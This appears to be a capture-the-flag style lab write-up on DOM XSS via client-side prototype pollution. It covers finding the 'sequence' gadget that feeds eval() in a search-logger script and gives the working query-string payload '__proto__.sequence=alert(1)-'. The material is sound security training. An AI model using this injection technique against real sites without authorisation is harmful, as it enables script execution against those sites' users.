## DOM XSS via an alternative prototype pollution vector

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.

Hint:

Pay attention to the XSS context. You need to adjust your payload slightly to ensure that the JavaScript syntax remains valid following your injection.

## Notes

- Search page 
- Possibility to leave a comment
- Feedback feature on /feedback
- /jquery_parseparams.js
- /searchLoggerAlternative.js
- /resources/js/jquery_3-0-0.js

## Resume

1. Enable DOM Invader.
2. Detect prototype pollution in the query string.
3. Scan for gadgets.
4. Identify the `sequence` gadget.
5. Observe the `eval()` sink.
6. Pollute `Object.prototype.sequence`.
7. Append `-` to neutralize the trailing `1`.
8. Trigger `alert(1)` and solve the lab.

## Solve

Open the lab in Burp's built-in browser.

Enable DOM Invader and activate the **Prototype Pollution** option.

Reload the page and observe that DOM Invader detects a prototype pollution vector in the query string.

Click **Scan for gadgets**.

Once the scan completes, open the DOM Invader tab and inspect the discovered gadget.

DOM Invader reports the following sink:

| Field | Value |
|---------|---------|
| Value | `if(manager && manager.sequence){ manager.macro(rxnnr82hprototypepollutionsequencerxnnr82h1) }` |
| Frame path | `top` |
| Event | `load` |
| Sink | `eval()` |
| Gadget | `sequence` |

The stack trace points to:

```javascript
searchLogger(...)
```

```javascript
at searchLogger (.../searchLoggerAlternative.js:18:5)
```

The vulnerable code eventually reaches:

```javascript
eval(...)
```

through the inherited `sequence` property.

Click **Exploit**.

DOM Invader generates a proof-of-concept payload, but it does not execute successfully.

Looking again at the sink reveals why:

```javascript
if(manager && manager.sequence){
    manager.macro(rxnnr82hprototypepollutionsequencerxnnr82h1)
}
```

Notice that the application appends a trailing:

```javascript
1
```

after the injected value.

To neutralize this extra character, append a minus sign (`-`) to the payload.

Final exploit:

```http
GET /?__proto__.sequence=alert(1)-
```

Or:

```text
https://0a3800de03ca37868049d5b200b90051.web-security-academy.net/?__proto__.sequence=alert%281%29-
```

After prototype pollution, the generated code becomes:

```javascript
alert(1)-1
```

This is valid JavaScript:

```javascript
alert(1)
```

executes first, then:

```javascript
-1
```

is evaluated afterwards.

Reload the page with the modified payload.

The browser executes:

```javascript
alert(1)
```

and the lab is solved.